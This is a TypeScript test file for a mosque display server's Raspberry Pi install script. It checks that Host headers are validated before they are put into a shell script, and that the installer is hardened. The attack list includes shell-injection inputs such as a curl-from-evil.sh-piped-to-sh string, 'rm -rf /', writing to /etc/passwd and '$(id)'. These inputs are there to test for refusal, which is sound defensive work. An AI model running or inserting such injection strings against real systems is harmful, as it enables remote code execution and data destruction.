// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (C) 2026 OpenMasjid-Solutions
/**
 * The install one-liner, and the one thing about it that has to be right.
 *
 * `/pi.sh` writes an address into a shell script, and that address comes out of the request's
 * `Host` header — which is set by whoever is calling. That makes this the only place in the app
 * where untrusted input is interpolated into something a machine will later *execute*, so the
 * tests here are about the boundary rather than the feature: what gets refused, and what the
 * refused thing would otherwise have done.
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import type { IncomingMessage } from 'node:http';
import { originFor, renderInstaller, installerTemplate } from './piInstaller';

const req = (headers: Record<string, string>, encrypted = false): IncomingMessage =>
  ({ headers, socket: { encrypted } }) as unknown as IncomingMessage;

// ── working out this server's address ────────────────────────────────────────

test('the address a Pi is told to use is the one it was curled from', () => {
  assert.equal(originFor(req({ host: '192.168.1.18:7860' }), '/pi.sh'), 'http://192.168.1.18:7860');
});

test('a direct TLS connection is reported as https', () => {
  assert.equal(originFor(req({ host: 'display.local' }, true), '/pi.sh'), 'https://display.local');
});

test('the platform ingress\'s forwarded headers win, since it is what a Pi can reach', () => {
  assert.equal(
    originFor(req({ host: 'internal:7860', 'x-forwarded-host': 'masjid.example', 'x-forwarded-proto': 'https' }), '/display/pi.sh'),
    'https://masjid.example/display',
  );
});

test('the tunnel prefix is kept, or the Pi would post to the platform root', () => {
  assert.equal(originFor(req({ host: 'h' }), '/display/pi.sh'), 'http://h/display');
  assert.equal(originFor(req({ host: 'h' }), '/pi.sh'), 'http://h');
});

test('a forwarded proto that is not https is treated as http, never passed through', () => {
  assert.equal(originFor(req({ host: 'h', 'x-forwarded-proto': 'gopher' }), '/pi.sh'), 'http://h');
});

test('a comma-joined forwarded chain uses the first hop', () => {
  assert.equal(
    originFor(req({ host: 'h', 'x-forwarded-host': 'first.example, second.example' }), '/pi.sh'),
    'http://first.example',
  );
});

test('an IPv6 literal is accepted in brackets', () => {
  assert.equal(originFor(req({ host: '[2001:db8::1]:7860' }), '/pi.sh'), 'http://[2001:db8::1]:7860');
});

// ── the part that would be a remote code execution if it were wrong ──────────

test('a Host header carrying shell syntax is refused, not sanitised', () => {
  // Each of these, substituted into `SERVER='…'` unchecked, ends the quoting and runs a command
  // on every Pi somebody sets up. A refusal is the only acceptable answer.
  const attacks = [
    "h';curl evil.sh|sh;'",
    'h$(id)',
    'h`id`',
    'h;reboot',
    'h\nSERVER=http://evil',
    'h"x',
    "h'x",
    'h x',
    'h|tee /etc/passwd',
    'h&&rm -rf /',
    'h\\',
    'h#comment',
    'h{a,b}',
    'h>out',
  ];
  for (const host of attacks) {
    assert.equal(originFor(req({ host }), '/pi.sh'), null, `accepted: ${JSON.stringify(host)}`);
  }
});

test('an attack routed through the forwarded header is refused too', () => {
  assert.equal(originFor(req({ host: 'ok', 'x-forwarded-host': "e';id;'" }), '/pi.sh'), null);
});

test('a missing or absurd Host is refused', () => {
  assert.equal(originFor(req({}), '/pi.sh'), null);
  assert.equal(originFor(req({ host: 'a'.repeat(300) }), '/pi.sh'), null);
  assert.equal(originFor(req({ host: 'h:999999' }), '/pi.sh'), null);
});

test('every accepted address is inert inside the script\'s single quotes', () => {
  // The second half of the guarantee: the charset cannot express an escape, AND the value lands
  // in single quotes. This asserts the property directly rather than trusting the pattern.
  const hosts = ['h', 'display.local', '192.168.1.18:7860', '[2001:db8::1]', 'a-b.c-d.example:65535'];
  for (const host of hosts) {
    const origin = originFor(req({ host }), '/pi.sh');
    assert.ok(origin, host);
    const line = `SERVER='${origin}'`;
    assert.ok(!/["`$\\\n\r;|&<>(){}]/.test(origin as string), `${origin} carries shell syntax`);
    assert.equal(line.split("'").length, 3, 'the value must not contain a quote of its own');
  }
});

// ── substitution ─────────────────────────────────────────────────────────────

test('every placeholder is filled in', () => {
  const out = renderInstaller("SERVER='@@SERVER@@' R='@@RESVG@@' A='@@AGENT_VERSION@@'", 'http://h', '2.6.2', '0.70.0-dev.8');
  assert.equal(out, "SERVER='http://h' R='2.6.2' A='0.70.0-dev.8'");
  assert.ok(!out.includes('@@'), 'a leftover placeholder is a Pi that installs and never connects');
});

test('a placeholder appearing twice is replaced every time', () => {
  assert.equal(renderInstaller('@@SERVER@@ and @@SERVER@@', 'x', '1', '1'), 'x and x');
});

test('a version string that is not a version cannot smuggle anything in', () => {
  const out = renderInstaller("R='@@RESVG@@'", 'http://h', "2.6.2';id;'", '0.1.0');
  assert.equal(out, "R='unknown'");
});

test('the real installer template renders with nothing left unfilled', () => {
  // Guards against renaming a placeholder in the script and not here, which would ship a Pi
  // installer with a literal @@SERVER@@ in it.
  const tpl = installerTemplate();
  assert.ok(tpl, 'the installer template should be findable from a source checkout');
  const out = renderInstaller(tpl as string, 'http://192.168.1.18:7860', '2.6.2', '0.70.0-dev.8');
  assert.ok(!out.includes('@@'), `unfilled placeholder: ${/@@[A-Z_]+@@/.exec(out)?.[0] ?? ''}`);
  assert.ok(out.includes("SERVER='http://192.168.1.18:7860'"));
});

test('the installer is POSIX sh, refuses to half-run, and never resets an adopted screen', () => {
  const tpl = installerTemplate() as string;
  assert.ok(tpl, 'template missing');
  // `set -eu`: a script piped into sh that half-runs leaves a Pi in a state nobody can describe.
  assert.ok(/^set -eu$/m.test(tpl), 'the installer must abort on the first failure');
  // The config is merged, not rewritten. A re-run that dropped the token would send somebody
  // back to the television to read a code that has already been used.
  assert.ok(/deviceSecret !== "string"/.test(tpl), 'the identity must only be minted when absent');
  assert.ok(!/rm -f? *"?\$CONF"?/.test(tpl), 'the installer must never delete the config');
  // Written through a temporary file: a power cut mid-write must not truncate the credentials.
  assert.ok(tpl.includes('fs.renameSync(tmp, file)'), 'the config write must be atomic');
  // Downloaded to .new and checked before being moved into place.
  assert.ok(tpl.includes('node --check "$PREFIX/agent.js.new"'), 'a truncated download must not become the agent');
});

test('the agent does not run as root', () => {
  const tpl = installerTemplate() as string;
  assert.ok(/^User=\$SERVICE_USER$/m.test(tpl), 'the long-running agent must drop privileges');
  assert.ok(/^SupplementaryGroups=video tty$/m.test(tpl), 'and hold only the groups it needs');
  assert.ok(/^Restart=always$/m.test(tpl), 'a masjid screen must come back on its own');
});

test('the installer carries its licence header, like every other file here', () => {
  const p = path.resolve(__dirname, 'assets', 'pi', 'install.sh');
  const onDisk = fs.existsSync(p) ? fs.readFileSync(p, 'utf8') : (installerTemplate() as string);
  assert.ok(onDisk.startsWith('# SPDX-License-Identifier: AGPL-3.0-only'));
});

// ── keeping a masjid's screens current ───────────────────────────────────────

test('the agent cannot rewrite its own code — the updater is a separate root unit', () => {
  const tpl = installerTemplate() as string;
  // The whole point of splitting it out. A long-running, network-facing process that can rewrite
  // its own binary is a much larger thing to trust than one that cannot.
  const rwp = /^ReadWritePaths=(.*)$/m.exec(tpl)?.[1] ?? '';
  assert.ok(!rwp.includes('$PREFIX'), 'the agent must not have write access to /opt');
  assert.ok(rwp.includes('$CONFDIR') && rwp.includes('$STATEDIR'));
  assert.ok(tpl.includes('openmasjid-screen-update.timer'), 'updates run on their own timer');
  assert.ok(tpl.includes('ExecStart=/opt/openmasjid-screen/update.sh'));
});

test('an update that will not start is rolled back', () => {
  const tpl = installerTemplate() as string;
  // Without this a bad build takes every screen in the masjid dark until somebody notices and
  // knows what to do — and nobody is watching these.
  assert.ok(tpl.includes('agent.js.prev'), 'the previous agent must be kept');
  assert.ok(/is-active --quiet openmasjid-screen\.service/.test(tpl), 'and its replacement checked');
  assert.ok(/rolling back/.test(tpl));
});

test('a truncated download never becomes the running agent', () => {
  const tpl = installerTemplate() as string;
  // Both the installer and the updater check, because either can be interrupted.
  assert.equal((tpl.match(/node --check/g) ?? []).length, 2);
});

test('a masjid with a screen in every hall does not stampede the server', () => {
  const tpl = installerTemplate() as string;
  assert.ok(/RandomizedDelaySec=/.test(tpl), 'every Pi asking at the same second is a thundering herd');
  assert.ok(/OnUnitActiveSec=/.test(tpl));
});

// ── trusting a masjid's own display server ───────────────────────────────────
//
// Found on real hardware: the server was at https://192.168.1.18:8444 behind a self-signed
// certificate with no SAN for that address. curl refused the script; and Node's fetch would have
// refused everything afterwards too, since Node does not read /etc/ssl/certs — so the agent would
// have installed cleanly and then never connected.

test('a self-signed server is pinned, not waved through', () => {
  const tpl = installerTemplate() as string;
  assert.ok(/openssl s_client -connect/.test(tpl), 'it must take a copy of the certificate');
  assert.ok(tpl.includes('--cacert "$CA"'), 'and verify against that copy');
  assert.ok(/NODE_EXTRA_CA_CERTS=\$CA/.test(tpl), 'the agent must be given it too — Node ignores /etc/ssl/certs');
});

test('verification is only abandoned when the name cannot match, and never quietly', () => {
  const tpl = installerTemplate() as string;
  const idx = tpl.indexOf('NODE_TLS_REJECT_UNAUTHORIZED=0');
  assert.ok(idx > 0, 'the fallback exists');
  // Every path that reaches it prints a warning first.
  const before = tpl.slice(Math.max(0, idx - 1500), idx);
  assert.ok(/warn /.test(before), 'falling back to no verification must be said out loud');
});

test('even the fallback pins the public key, so an impostor is still refused', () => {
  // Plain -k accepts ANY certificate, including an attacker's. Pinning the key means they need
  // the private key rather than merely a position on the network. Verified against a real
  // impostor server: accepted the genuine one, rejected the impostor.
  const tpl = installerTemplate() as string;
  assert.ok(tpl.includes('--pinnedpubkey sha256//'), 'the mismatch path must pin the key');
  assert.ok(/openssl x509 -in "\$CA" -pubkey -noout/.test(tpl));
});

test('the updater makes the same trust decision, or self-update stops forever', () => {
  const tpl = installerTemplate() as string;
  // The updater is a separate script with no access to the installer's variables, so it has to
  // re-derive this. Getting it wrong means updates fail silently on every self-signed server.
  const upd = tpl.slice(tpl.indexOf('cat > "$PREFIX/update.sh"'));
  assert.ok(upd.includes('insecureTls'), 'it must read the recorded decision');
  assert.ok(upd.includes('--pinnedpubkey sha256//'), 'and pin the key the same way');
  assert.ok(upd.includes('--cacert $CA'), 'or use the pinned certificate');
  assert.ok(/curl -fsSL --max-time 120 \$CURL_OPTS/.test(upd), 'and actually pass it to curl');
});

// ── an install that looks hung is an install people reboot half-done ─────────

test('apt is not silenced, and cannot wait forever', () => {
  const tpl = installerTemplate() as string;
  // A freshly booted Pi runs unattended-upgrades, which holds the dpkg lock. With -qq and
  // >/dev/null the installer sat there printing nothing for over fifteen minutes.
  assert.ok(!/apt-get[^\n]*-qq[^\n]*install/.test(tpl), 'apt install must not be quiet');
  assert.ok(!/apt-get[^\n]*install[^\n]*>\s*\/dev\/null/.test(tpl), 'nor have its output discarded');
  assert.ok(tpl.includes('DPkg::Lock::Timeout'), 'apt must not block on the lock indefinitely');
  assert.ok(tpl.includes('wait_for_apt'), 'and should say who is holding it');
});

test('the slow steps announce themselves before they run', () => {
  const tpl = installerTemplate() as string;
  assert.ok(/^STEPS=(\d+)$/m.test(tpl));
  const declared = Number(/^STEPS=(\d+)$/m.exec(tpl)?.[1]);
  const calls = (tpl.match(/^step /gm) ?? []).length;
  assert.equal(calls, declared, 'the step counter must match the number of steps');
  assert.ok(!/npm install[^\n]*>\s*\/dev\/null/.test(tpl), 'the npm install must not be silent either');
});

test('ffmpeg failing does not cost you the timetable', () => {
  const tpl = installerTemplate() as string;
  // It is the largest download by far and the only part not needed to show prayer times.
  const i = tpl.indexOf('Installing ffmpeg');
  assert.ok(i > 0, 'ffmpeg should be its own step');
  const block = tpl.slice(i, i + 900);
  assert.ok(/if apt-get .*ffmpeg; then/.test(block), 'its failure must be handled, not fatal');
  assert.ok(/warn /.test(block));
});
